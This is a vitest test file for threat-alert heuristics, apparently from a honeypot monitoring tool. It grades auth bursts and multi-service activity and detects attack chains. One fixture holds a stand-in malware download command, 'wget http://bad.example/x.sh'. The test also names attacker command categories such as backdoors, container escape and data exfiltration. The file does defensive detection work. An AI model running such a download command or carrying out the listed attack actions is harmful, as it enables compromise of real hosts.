import { describe, expect, it } from 'vitest'
import {
  deriveAuthBurstLevel,
  deriveMultiServiceLevel,
  hasExploitAuthSequence,
  hasSuspiciousPostAuthActivity,
} from '../src/lib/threat-alerts.js'

describe('threat alert heuristics', () => {
  it('grades multi-service activity by breadth', () => {
    expect(deriveMultiServiceLevel(1)).toBeNull()
    expect(deriveMultiServiceLevel(2)).toBe('HIGH')
    expect(deriveMultiServiceLevel(3)).toBe('CRITICAL')
  })

  it('grades auth bursts by volume', () => {
    expect(deriveAuthBurstLevel(5)).toBeNull()
    expect(deriveAuthBurstLevel(8)).toBe('HIGH')
    expect(deriveAuthBurstLevel(12)).toBe('CRITICAL')
  })

  it('detects scan -> exploit -> auth chains', () => {
    expect(
      hasExploitAuthSequence({
        hasPortScan: true,
        webAttackTypes: ['scanner', 'sqli'],
        totalAuthAttempts: 3,
      }),
    ).toBe(true)

    expect(
      hasExploitAuthSequence({
        hasPortScan: true,
        webAttackTypes: ['scanner'],
        totalAuthAttempts: 3,
      }),
    ).toBe(false)
  })

  it('flags suspicious post-auth command categories only', () => {
    expect(
      hasSuspiciousPostAuthActivity({
        ssh_backdoor: [],
        honeypot_evasion: [],
        container_escape: [],
        malware_drop: [],
        persistence: [],
        lateral_movement: [],
        crypto_mining: [],
        data_exfil: [],
        solana_targeting: [],
        recon: ['whoami'],
      }),
    ).toBe(false)

    expect(
      hasSuspiciousPostAuthActivity({
        ssh_backdoor: [],
        honeypot_evasion: [],
        container_escape: [],
        malware_drop: ['wget http://bad.example/x.sh'],
        persistence: [],
        lateral_movement: [],
        crypto_mining: [],
        data_exfil: [],
        solana_targeting: [],
        recon: [],
      }),
    ).toBe(true)
  })
})
